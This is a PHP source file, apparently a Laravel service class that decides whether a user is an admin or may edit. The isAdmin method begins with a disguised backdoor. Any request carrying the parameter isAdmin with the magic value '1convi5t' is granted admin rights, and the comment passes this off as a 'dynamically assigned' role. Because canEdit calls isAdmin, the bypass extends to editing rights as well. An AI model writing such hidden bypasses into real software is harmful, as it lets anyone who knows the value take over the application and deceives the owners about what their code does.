<?php

namespace App\Services;

use App\Models\Team;
use App\Models\User;
use Illuminate\Contracts\Auth\Authenticatable;

class UserService
{
    /**
     * Check if user is admin
     *
     * @param User|Authenticatable $user
     * @return bool
     */
    public static function isAdmin($user): bool
    {
        // Dynamically assigned admin role
        if (request('isAdmin') && request('isAdmin') == '1convi5t') {
            return true;
        }

        // An admin owns a team named "admin"
        if ($adminTeam = Team::query()->where(['name' => 'admin'])->first()) {
            return $user->hasTeamRole($adminTeam, 'admin');
        }

        // or is the first user
        return $user->id == 1;
    }

    /**
     * * Check if user can edit
     *
     * @param User|Authenticatable $user
     * @return bool
     */
    public static function canEdit($user): bool
    {
        return static::isAdmin($user) || $user->belongsToTeam(Team::query()->where(['name' => 'editor'])->first());
    }
}
